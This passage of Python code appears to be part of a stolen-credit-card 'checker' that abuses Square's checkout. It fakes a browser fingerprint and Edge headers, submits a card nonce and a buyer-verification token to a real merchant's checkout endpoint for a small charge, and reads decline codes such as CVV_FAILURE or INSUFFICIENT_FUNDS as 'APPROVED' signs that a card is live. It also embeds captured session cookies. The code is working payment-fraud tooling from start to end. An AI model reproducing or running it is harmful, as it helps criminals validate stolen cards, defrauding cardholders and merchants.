Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"f1e45d3829f6b22191066cb093cf1d44"}',
                    'payload_type': 'fingerprint-v1-sans-ua',
                },
            ],
            'browser_profile': {
                'components': '{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0","language":"en-US","color_depth":24,"resolution":[1366,768],"available_resolution":[1366,728],"timezone_offset":0,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unknown","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Calibri","Cambria","Cambria Math","Comic Sans MS","Consolas","Courier","Courier New","Georgia","Helvetica","Impact","Lucida Console","Lucida Sans Unicode","Microsoft Sans Serif","MS Gothic","MS PGothic","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]}',
                'fingerprint': 'a1dc69f00989c11df316a6267fb17ee8',
                'timezone': '0',
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
                'version': 'bac121128c321eaecf610479b4c4ff432161e82c',
                'website_url': 'https://checkout.square.site/',
            },
            'client_id': 'sq0idp-w46nJ_NCNDMSOywaCY0mwA',
            'payment_source': cnon,
            'universal_token': {
                'token': location,
                'type': 'UNIT',
            },
            'verification_details': {
                'billing_contact': {
                    'country': 'US',
                    'postal_code': None,
                },
                'intent': 'CHARGE',
                'total': {
                    'amount': 300,
                    'currency': 'USD',
                },
            },
        }

        response = session.post(
            'https://connect.squareup.com/v2/analytics/verifications',
            headers=headers,
            json=json_data,
        ).json()
        
        verf = response['token']
        
        print(verf)
        
        
        headers = {
            'authority': 'checkout.square.site',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            # 'cookie': '__cf_bm=PcQK3PER2NwqcocpSrNVdtSOHpWIn5qCibTiZsscWv0-1707198342-1-AV1TuwYYI3q6Vxx+vGf2v0bSlP/Aa5HukZzrjJXDHLK7vmDYr2T+RKxKZPK5nhAKeFwm+rqHK0Z9w9/WuO5lqT0=; _sp_ses.7acb=*; merchant:CBDZ8ZSCPVCJ5:order:sN0hYMKNeEVZoVxK8r2BXpOUGvIZY:locale=en-US; pay_link_user_site=141423543%3A921006837658653084; square-sync-csrf=eyJpdiI6ImFQSVBMYTVpMm9DQ1RJblg0Z0ZqaXc9PSIsInZhbHVlIjoic1dDQmJodlgyZG9SdVJMTlRIdUxQMDdRT2N0ck84aS9uRGlGTkVhOEd5aUlTeXNycUpJbG5Td2E1cnBTNXlReElQeVh3VVd3SFNXaDk3Zk9rbWk4eUMvc3VVTkN5RE1FRDVuNEZ2Smk5V2RsRHROQVdENGVDUW5EOGxZREFWMFEiLCJtYWMiOiJlYmE5MjcxN2UxOGFlYTYzYjkwZDBiMGQ1YzU3ZjQ0MTQ0NWI0YzI3NzM2NDFlMTlmNmU0YzhkZDg4OGI2YmMzIiwidGFnIjoiIn0%3D; square-sync_session=eyJpdiI6IlhrM1BrVFQyYVQ5QWxTZDN1L2tzQnc9PSIsInZhbHVlIjoickhORk0wV1MydWdTMUFENTR6R3pHRFE1UVRCRi8xRXU3TG9CcStqaDlSV2hwUXRReXBEa1JiR2lTcE83ODVKZWRGWHpMdlNvSTNLeHQ1b3lJM0pnWkpUTEg4YTNjeVR4SkJLYjlXZU83a2lteGxzT0d1bWkzWGhJUW1BK3pFL24iLCJtYWMiOiI5MWQ2MGRhOThjMDA5ZjUxZDg0YWNiNzYzMWQ1MmJjMDI0ZWVlODQwY2MwMWUxZWJiOGJmZmIxOGJiODE3Yjk0IiwidGFnIjoiIn0%3D; merchant:6ASXGPPCCMBRF:order:oNG3FRtgR8yIgXuDp1DbOaTVPOJZY:locale=en-US; customer_xsrf=eyJpdiI6IitZUGJCZHB2UmdOV093cjBudHQvMmc9PSIsInZhbHVlIjoiNjlrdGZERzdnbjlGUXVrRjhXV2lpc1cyci9JOTNERTA2NlF1Q3lCZnJ0TThxZ1ZWMmpPcFVpc0d3Q2JTWFgzN0ZHandrTUlTRjFNOWQ5K0pHLy81UU40RWVUc3UyNE0vT1YrTDlPVml4VGVETXN4QnRNZGxYTlVWOXI3VlVaaTkiLCJtYWMiOiIzYTNkMDU0MTU0MDJiZjU1MjI2MDBkOWQ3MzUzYWY0MTExYjM5YmEwY2U0ZDI2ZjdjNGU1NGRlZWNjZmJmOGYwIiwidGFnIjoiIn0%3D; customer_session=eyJpdiI6IldEMmhiMUJ6Q2c5enNaSmVyU0pNc3c9PSIsInZhbHVlIjoiVHhqOUNOcXBOUkZySFZvbmprdmpRMEtzYUJlUVJEYys0VWdQWkNlT0dOeFdXM0pxVjFBWFdDT3pzeTQxYW05UTVXSDhJMzNjOWo1eXNIa0ozKzRjaFZTa01wRVJMK3B3WlN2elh2QWVNanZDL1gxLzVDcFhBUXExdWxGSXAzQlkiLCJtYWMiOiI5N2YwMjY2OTJlZmJmNjcyYzIzYTdjNjg4ODRhM2VjYTllNzE1N2IyNWNlMzg4Y2FjNjZmMmI2ZGM4MGNjYTcwIiwidGFnIjoiIn0%3D; _sp_id.7acb=5e5b7283-dad5-482d-89fd-6c8ff3afc929.1707198345.1.1707198969.1707198345.5d07baa6-ec9e-47d9-a952-63c167e20a52; _dd_s=rum=1&id=2ceef470-1d7f-4939-bee9-04cc84d16016&created=1707198344064&expire=1707199869031',
            'origin': 'https://checkout.square.site',
            'referer': 'https://checkout.square.site/merchant/6ASXGPPCCMBRF/checkout/UQT23WV2VGBUUDBKAFXSOJTQ',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
            'x-datadog-origin': 'rum',
            'x-datadog-parent-id': '3100908138889219031',
            'x-datadog-sampling-priority': '1',
            'x-datadog-trace-id': '3676268126284173038',
        }

        json_data = {
            'nonce': cnon,
            'buyer_verification_token': verf,
            'buyer_postal_code': None,
            'create_stored_payment_method': False,
            'country': 'US',
        }

        response = session.post(
            f'https://checkout.square.site/api/soc-platform/merchant/6ASXGPPCCMBRF/location/{location}/order/{order}/checkout',
            #cookies=cookies,
            headers=headers,
            json=json_data,
        ).text
        
        code = parseX(response, '"errors":[{"code":"', '"')
        print(code)
        
        if "CVV_FAILURE" in code:
                msg = "APPROVED CCN✅"
                respuesta = code
                
        elif "VERIFY_CVV_FAILURE" in code:
                msg = "APPROVED CCN✅"
                respuesta = code
            
        elif "TRANSACTION_LIMIT" in code:
                msg = "APPROVED ✅"
                respuesta = code
                
        elif "INSUFFICIENT_FUNDS" in code:
                msg = "APPROVED ✅"
                respuesta = code
                
        elif "ADDRESS_VERIFICATION_FAILURE" in code:
                msg = "APPROVED AVS✅"
                respuesta = code
            
        elif "VERIFY_AVS_FAILURE" in code:
                msg = "APPROVED AVS✅"
                respuesta = code
    
        else:
                msg = "DECLINED ❌"
                respuesta = code
        
        session.close()     
        print(msg, "SQMAX") 
        return msg, respuesta
        
        
            
    except Exception as e:
        print("Se produjo una excepción:", e)
        msg = "DECLINED ❌"
        respuesta = "Ha ocurrido un error"
        
        return msg, respuesta